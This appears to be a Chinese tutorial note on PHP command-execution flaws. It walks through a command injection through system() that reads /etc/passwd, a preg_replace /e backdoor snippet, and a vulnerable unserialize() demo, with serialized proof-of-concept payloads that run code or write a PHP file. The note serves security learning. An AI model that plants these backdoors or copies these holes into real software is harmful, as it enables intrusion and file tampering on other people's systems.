#命令执行
system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()，`dir`

函数原型

string system(string command, int &return_var)

    command 要执行的命令

    return_var 存放执行命令的执行后的状态值

string exec (string command, array &output, int &return_var)

    command 要执行的命令

    output 获得执行命令输出的每一行字符串

    return_var 存放执行命令后的状态值

void passthru (string command, int &return_var)

    command 要执行的命令

    return_var 存放执行命令后的状态值

string shell_exec (string command)

    command 要执行的命令

漏洞分析
//ex1.php 
    $dir = $_GET["dir"]; 
    if (isset($dir)) 
    { 
    echo "

    "; 

    system("ls -al ".$dir); 
    echo "

";  }  ?> 

我们提交http://www.sectop.com/ex1.php?dir=| cat /etc/passwd

提交以后，命令变成了 system("ls -al | cat /etc/passwd");



下面是一些有意思的：
【1】preg_replace（）这个函数：
出发条件：
01：第一个参数需要e标识符，有了它可以执行第二个参数的命令
02：第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：
//echo preg_replace(‘/test/e’, ‘phpinfo()’, ‘just test’);这样是可以执行命令的
//echo preg_replace(‘/test/e’, ‘phpinfo()’, ‘just tesxt’); 或者echo preg_replace(‘/tesxt/e’, ‘phpinfo()’, ‘just test’); 这两种没有匹配上，所以返回值是第三个参数，不会执行命令
利用：

我们可以构造这样的后门代码：

    @preg_replace("//e",$_GET['h'],"Access Denied");   
    echo preg_replace("/test/e",$_GET["h"],"jutst test");  

当访问这样这样的链接时就可以被触发：

http://localhost:8000/testbug.php?h=phpinfo();


【2】php反序列化漏洞：
[php] view plain copy

    <?php  
    class Example  
    {  
    var $var = "";  
    function __destruct()  
        {  
            eval($this->var);  
        }  
    }  
    class foo{  
        public $file="";  
        public $data="";  
                function __wakeup(){  
            file_put_contents($this->file,$this->data);  
            echo "调用";  
        }  
          
    }  
      
     $str=$_GET["name"];  
     unserialize($str);  
    ?>  


参考：http://www.freebuf.com/vuls/80293.html

这个很有意思

首先php反序列化可以反序列化成为一个对象，而这个对象被创建之后就会自动调用php的魔幻方法

__destruct()

__wakeup()


并且将参数传递进去，从而实现恶意的攻击


利用条件：

1、应用程序中必须含有一个实现某个PHP魔幻方法（例如__wakeup或者__destruct）的类，可以用这个类进行恶意攻击，或者开始一个“POP链”。

2、当调用脆弱的unserialize()时，必须声明攻击期间所使用的所有类，否则必须为这些类支持对象自动加载。


利用过程：

http://localhost:8000/testbug.php?name=O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo();%22;}



下面就是一个命令执行的poc参数

O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo();%22;}


第一个O是代表object：表示反序列化为一个类

第二个7是类名的长度，比如我要反序列化成为Example的一个对象，那么“Example”长度就是7

第三个Example是类名，要用%22包裹住，而%22就是“的url形式

第四个1是参数的数量，我这里只有一个参数var

第五个：{s:3:%22var%22;s:10:%22phpinfo();%22;}这个里面是要传递进去的参数

5.1的s表示的是一个字符串

5.2的3表示的是参数名的长度

5.3的var是参数名

5.4的s表示的是一个字符串

5.5的10表示的是变量的长度

5.6的phpinfo();是实际的变量


这个poc执行之后首先会创建一个Example的对象，然后将var的值传递进去，然后调用__destruct()

就像

$obj=newExample;

$obj->var=”phpinfo();”;

$obj->__wakeup();


这样的过程


第二个利用的poc是：


http://localhost:8000/testbug.php?name=O:3:%22foo%22:2:{s:4:%22file%22;s:10:%22heheda.php%22;s:4:%22data%22;s:19:%22<?phpphpinfo(); ?>%22;}


可以看出来，php反序列化可以调用任何类




    

eval注入攻击

